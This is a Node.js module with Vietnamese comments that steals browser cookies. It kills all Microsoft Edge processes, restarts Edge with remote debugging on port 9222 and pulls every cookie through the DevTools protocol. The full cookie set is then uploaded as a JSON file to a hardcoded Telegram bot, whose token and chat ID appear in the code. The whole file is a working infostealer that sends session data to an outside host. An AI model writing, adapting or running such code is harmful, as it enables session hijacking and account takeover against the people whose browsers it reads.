// readEdgeCookies.js - FIXED VERSION
const { exec, spawn } = require('child_process');
const puppeteer = require('puppeteer-core');
const https = require('https');
const { Readable } = require('stream');
const net = require('net');

// Thông tin Telegram
const TELEGRAM_BOT_TOKEN = '8268575626:AAF-azWchMAmpAFFxGvRK63jSFIbWVm2KVY';
const TELEGRAM_CHAT_ID = '5741883868';

let isProcessing = false;
let edgeProcess = null;

function sendFileToTelegram(cookiesData, fileName) {
  return new Promise((resolve, reject) => {
    const FormData = require('form-data');
    const form = new FormData();
    
    const jsonString = JSON.stringify(cookiesData, null, 2);
    const stream = Readable.from([jsonString]);
    
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('document', stream, {
      filename: fileName,
      contentType: 'application/json'
    });
    form.append('caption', `🍪 Cookies từ Edge browser\n📁 ${fileName}\n📊 Tổng: ${cookiesData.length} cookies`);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: form.getHeaders()
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        console.log('📡 Telegram response status:', res.statusCode);
        
        if (res.statusCode === 200) {
          try {
            const parsed = JSON.parse(data);
            if (parsed.ok) {
              resolve(parsed);
            } else {
              reject(new Error(`Telegram API error: ${parsed.description || data}`));
            }
          } catch (e) {
            reject(new Error(`Parse error: ${e.message}`));
          }
        } else {
          reject(new Error(`HTTP ${res.statusCode}: ${data}`));
        }
      });
    });

    req.on('error', reject);
    form.on('error', reject);
    form.pipe(req);
  });
}

function sendMessageToTelegram(text) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    };

    const req = https.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => { responseData += chunk; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          resolve(JSON.parse(responseData));
        } else {
          reject(new Error(`Telegram API error: ${responseData}`));
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// ✅ FIXED: Kiểm tra port có available không
function checkPortAvailable(port) {
  return new Promise((resolve) => {
    const server = net.createServer();
    
    server.once('error', (err) => {
      if (err.code === 'EADDRINUSE') {
        console.log(`⚠️ Port ${port} đang được sử dụng`);
        resolve(false);
      } else {
        resolve(false);
      }
    });
    
    server.once('listening', () => {
      server.close();
      console.log(`✅ Port ${port} available`);
      resolve(true);
    });
    
    server.listen(port, '127.0.0.1');
  });
}

// ✅ FIXED: Kiểm tra Edge có đang chạy với remote debugging không
async function checkRemoteDebugging() {
  try {
    const response = await fetch('http://localhost:9222/json/version', {
      signal: AbortSignal.timeout(2000)
    });
    
    if (response.ok) {
      const data = await response.json();
      console.log('✅ Edge đã có remote debugging:', data.Browser);
      return true;
    }
    return false;
  } catch (err) {
    console.log('⚠️ Edge chưa có remote debugging:', err.message);
    return false;
  }
}

// ✅ FIXED: Kill tất cả Edge processes và đợi port free
function killAllEdge() {
  return new Promise((resolve) => {
    console.log('🔴 Đang đóng tất cả Edge...');
    
    exec('taskkill /F /IM msedge.exe /T', async (err) => {
      if (err) {
        console.log('⚠️ Không có Edge nào đang chạy:', err.message);
      } else {
        console.log('✅ Đã gửi lệnh đóng Edge');
      }
      
      // ✅ Đợi port 9222 free (max 10 giây)
      console.log('⏳ Đợi port 9222 free...');
      let attempts = 0;
      const maxAttempts = 10;
      
      const waitInterval = setInterval(async () => {
        attempts++;
        const isAvailable = await checkPortAvailable(9222);
        
        if (isAvailable) {
          console.log('✅ Port 9222 đã free');
          clearInterval(waitInterval);
          resolve();
        } else if (attempts >= maxAttempts) {
          console.log('⚠️ Timeout đợi port free, tiếp tục anyway...');
          clearInterval(waitInterval);
          resolve();
        } else {
          console.log(`⏳ Đợi port free... (${attempts}/${maxAttempts})`);
        }
      }, 1000);
    });
  });
}

// ✅ FIXED: Khởi động Edge với remote debugging và verify
function startEdgeWithDebugging() {
  return new Promise(async (resolve, reject) => {
    const fs = require('fs');
    const edgePath1 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    const edgePath2 = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
    
    let executablePath;
    if (fs.existsSync(edgePath2)) {
      executablePath = edgePath2;
    } else if (fs.existsSync(edgePath1)) {
      executablePath = edgePath1;
    } else {
      return reject(new Error('❌ Không tìm thấy Edge executable'));
    }

    console.log('🚀 Khởi động Edge với remote debugging...');
    console.log('📂 Path:', executablePath);
    
    // ✅ Spawn với stdio để catch lỗi
    edgeProcess = spawn(executablePath, [
      '--remote-debugging-port=9222',
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-extensions',
      '--disable-background-networking'
    ], {
      detached: true,
      stdio: ['ignore', 'pipe', 'pipe'] // ✅ Capture stdout/stderr
    });

    // ✅ Log errors
    edgeProcess.stderr.on('data', (data) => {
      console.log('Edge stderr:', data.toString());
    });

    edgeProcess.on('error', (err) => {
      console.error('❌ Edge process error:', err);
      reject(err);
    });

    edgeProcess.unref();

    // ✅ Verify Edge đã khởi động bằng cách check port
    console.log('⏳ Đợi Edge khởi động và verify...');
    
    let attempts = 0;
    const maxAttempts = 15; // 15 giây
    
    const verifyInterval = setInterval(async () => {
      attempts++;
      
      const isReady = await checkRemoteDebugging();
      
      if (isReady) {
        console.log('✅ Edge đã sẵn sàng và verified!');
        clearInterval(verifyInterval);
        resolve();
      } else if (attempts >= maxAttempts) {
        console.log('❌ Timeout: Edge không khởi động sau 15 giây');
        clearInterval(verifyInterval);
        reject(new Error('Edge không khởi động được sau 15 giây'));
      } else {
        console.log(`⏳ Đợi Edge... (${attempts}/${maxAttempts})`);
      }
    }, 1000);
  });
}

// ✅ FIXED: Retry connect với better error handling
async function connectWithRetry(maxRetries = 5) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      console.log(`🔄 Thử connect lần ${i + 1}/${maxRetries}...`);
      
      const browser = await puppeteer.connect({
        browserURL: 'http://localhost:9222',
        defaultViewport: null,
        timeout: 5000
      });
      
      console.log('✅ Connect thành công!');
      return browser;
      
    } catch (err) {
      console.log(`❌ Lần ${i + 1} thất bại:`, err.message);
      
      if (i < maxRetries - 1) {
        console.log('⏳ Đợi 2 giây trước khi thử lại...');
        await new Promise(resolve => setTimeout(resolve, 2000));
      } else {
        throw new Error(`Không thể kết nối Edge sau ${maxRetries} lần thử: ${err.message}`);
      }
    }
  }
}

async function getCookiesAndSendTelegram() {
  if (isProcessing) {
    console.log('⏳ Đang xử lý request khác, skip...');
    return { success: false, message: 'Already processing' };
  }

  isProcessing = true;
  let browser = null;

  try {
    console.log('🔍 Bắt đầu lấy cookies...');
    await sendMessageToTelegram('🔍 Bắt đầu lấy cookies từ Edge...');
    
    // ✅ Bước 1: Kiểm tra Edge có remote debugging chưa
    const hasDebugging = await checkRemoteDebugging();
    
    if (!hasDebugging) {
      console.log('🔄 Edge chưa có remote debugging, đang restart...');
      await sendMessageToTelegram('🔄 Đang khởi động lại Edge với remote debugging...');
      
      await killAllEdge();
      await startEdgeWithDebugging();
    }

    // ✅ Bước 2: Connect với retry
    browser = await connectWithRetry();
    console.log('✅ Đã kết nối tới Edge');

    // ✅ Đợi Edge load xong
    console.log('⏳ Đợi Edge load hoàn toàn...');
    await new Promise(resolve => setTimeout(resolve, 2000));

    const pages = await browser.pages();
    console.log(`📄 Tìm thấy ${pages.length} tabs`);
    
    let page;
    if (pages.length === 0) {
      console.log('📄 Tạo tab mới...');
      page = await browser.newPage();
      await page.goto('about:blank');
    } else {
      page = pages[0];
    }

    const client = await page.target().createCDPSession();
    const { cookies } = await client.send('Network.getAllCookies');
    
    console.log(`✅ Tổng cookies: ${cookies.length}`);
    
    if (cookies.length === 0) {
      await sendMessageToTelegram('⚠️ Không có cookies nào! (Edge mới khởi động, chưa đăng nhập)');
      await browser.disconnect();
      isProcessing = false;
      return { success: true, cookieCount: 0, message: 'No cookies yet' };
    }

    const fileName = `edge_cookies_${Date.now()}.json`;
    const jsonString = JSON.stringify(cookies, null, 2);
    const sizeKB = (Buffer.byteLength(jsonString, 'utf8') / 1024).toFixed(2);
    
    console.log(`📦 Data size: ${sizeKB} KB`);
    console.log('📤 Đang gửi cookies lên Telegram...');
    
    await sendFileToTelegram(cookies, fileName);
    console.log('✅ Đã gửi file thành công!');
    
    const summary = `✅ <b>Hoàn thành!</b>\n\n` +
                   `🍪 Tổng cookies: <b>${cookies.length}</b>\n` +
                   `📁 File: ${fileName}\n` +
                   `📦 Size: ${sizeKB} KB\n` +
                   `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}`;
    
    await sendMessageToTelegram(summary);
    console.log('✅ Đã gửi summary lên Telegram!');

    await browser.disconnect();
    console.log('✅ Hoàn thành! Edge vẫn đang chạy.');
    
    isProcessing = false;
    return { success: true, cookieCount: cookies.length };

  } catch (err) {
    console.error('❌ Lỗi chi tiết:', err);
    
    try {
      await sendMessageToTelegram(`❌ <b>Lỗi:</b>\n${err.message}\n\n<b>Stack:</b>\n${err.stack?.slice(0, 500)}`);
    } catch (teleErr) {
      console.error('❌ Không gửi được thông báo lỗi:', teleErr.message);
    }
    
    isProcessing = false;
    throw err;
    
  } finally {
    if (browser) {
      try {
        await browser.disconnect();
      } catch (e) {
        console.log('⚠️ Lỗi disconnect browser:', e.message);
      }
    }
  }
}

module.exports = { getCookiesAndSendTelegram };